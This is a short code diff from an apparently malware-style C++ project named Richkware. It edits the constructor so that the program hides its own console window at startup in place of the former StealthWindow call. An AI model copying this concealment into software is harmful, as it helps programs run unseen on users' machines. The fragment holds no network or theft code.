@@ -112,8 +112,7 @@ void Richkware::Hibernation() {
 
 Richkware::Richkware(const char* AppNameArg, const char* EncryptionKeyArg) {
 		appName = AppNameArg;
-		system(("title " + appName).c_str());
-		StealthWindow(appName.c_str());
+		ShowWindow(GetConsoleWindow(),0);
 		encryptionKey = EncryptionKeyArg;
 		network = Network(EncryptionKeyArg);
 		session = Session(EncryptionKeyArg, AppNameArg);
